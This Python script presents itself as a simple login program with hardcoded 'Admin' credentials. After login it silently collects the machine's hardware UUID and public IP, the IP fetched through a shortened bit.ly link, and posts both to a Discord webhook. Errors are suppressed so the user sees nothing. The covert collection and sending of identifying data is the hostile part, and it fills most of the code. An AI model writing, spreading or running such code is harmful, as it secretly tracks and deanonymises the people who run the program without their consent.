import os
import re
import json
import time
import requests
from base64 import b64decode
from discord_webhook import DiscordWebhook
import subprocess

from urllib.request import Request, urlopen

username = 'Admin'
password = 'Admin'

webhook = 'WEBHOOK HERE'

PING_ME = False #False-no True-yes

hwid = str(subprocess.check_output(
    'wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()

a = input("Username: ")
if a == username:
    b = input("Password: ")
    if b == password:
        print("Logged in!")
        print("Connecting")
        time.sleep(3)
        os.system('cls')
        ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
        message = '@everyone' if PING_ME else ''
        message2 = '''
**Simple Login**
Someone Logged From
Hwid: ''' + hwid 
        headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
        payload = json.dumps({'content': message2 + message})
        try:
            req = Request(webhook, data=payload.encode(), headers=headers)
            urlopen(req)  
            webhook = DiscordWebhook(url=f'{webhook}', content=f'Ip adress: {ip} \n')  
            response = webhook.execute()
        except:
            pass
        print("Welcome to Main")
        os.system("pause")
    else:
        print("Wrong Password")
else:
    print("Wrong Username")